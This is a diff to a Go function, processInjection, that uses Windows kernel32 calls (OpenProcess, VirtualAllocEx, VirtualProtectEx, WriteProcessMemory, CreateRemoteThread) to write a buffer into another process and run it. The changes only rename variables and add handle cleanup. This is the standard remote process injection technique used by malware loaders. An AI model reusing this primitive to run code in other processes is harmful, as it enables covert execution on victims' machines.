@@ -14,11 +14,11 @@ const (
 )
 
 func processInjection(procId uintptr, buf *byte, size uintptr) {
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 
+	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	procOpenProcess := kernel32.NewProc("OpenProcess")
-	procVirtualAlloc := kernel32.NewProc("VirtualAllocEx")
-	procVirtualProtect := kernel32.NewProc("VirtualProtectEx")
+	procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	procVirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
 	procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
 	procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
 
@@ -26,9 +26,10 @@ func processInjection(procId uintptr, buf *byte, size uintptr) {
 		0,
 		procId,
 	)
+	defer syscall.CloseHandle(syscall.Handle(hProcess))
 	fmt.Println(hProcess)
 
-	addr, _, err := procVirtualAlloc.Call(
+	addr, _, err := procVirtualAllocEx.Call(
 		hProcess,
 		0,
 		size,
@@ -40,7 +41,7 @@ func processInjection(procId uintptr, buf *byte, size uintptr) {
 	}
 	oldProtect := uint32(0)
 
-	ret, _, err1 := procVirtualProtect.Call(
+	ret, _, err1 := procVirtualProtectEx.Call(
 		hProcess,
 		addr,
 		size,
@@ -79,6 +80,6 @@ func processInjection(procId uintptr, buf *byte, size uintptr) {
 		0,
 		uintptr(unsafe.Pointer(&threadId)),
 	)
-
+	defer syscall.CloseHandle(syscall.Handle(handle))
 	fmt.Println(handle)
 }
